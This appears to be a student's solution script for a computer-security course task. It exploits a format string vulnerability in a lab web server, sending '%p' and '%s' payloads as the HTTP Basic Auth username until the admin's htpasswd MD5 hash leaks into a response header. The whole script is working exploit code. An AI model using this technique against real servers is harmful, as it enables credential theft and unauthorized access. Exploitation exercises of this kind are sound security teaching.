# Task 1

import requests
from requests.auth import HTTPBasicAuth

# Using format string vulnerability we get htpasswd key

url = 'http://project-2.csec.chatzi.org:8000/'

key = 'WWW-Authenticate'
htpasswd_key = 'admin:'

counter = 1

# Repeatedly add more %p and then %s to stringify the response 

while True:

    request_payload = counter * '%p ' + '%s'
    auth = HTTPBasicAuth(request_payload, ' ')

    try:
        response_text = requests.get(url, auth=auth, timeout=3).headers[key].split('=')[1]
    except:
        counter += 1
        continue

    # If response has 'admin:' then the key is next to it
    if htpasswd_key in response_text:
        htpasswd_pwd = response_text.split(htpasswd_key)[1][:-1]
        if (len(htpasswd_pwd) == 32):
            print(f'Request Payload: {request_payload}')
            print(f'MD5 Digest: {htpasswd_pwd}')
            break
    
    counter += 1
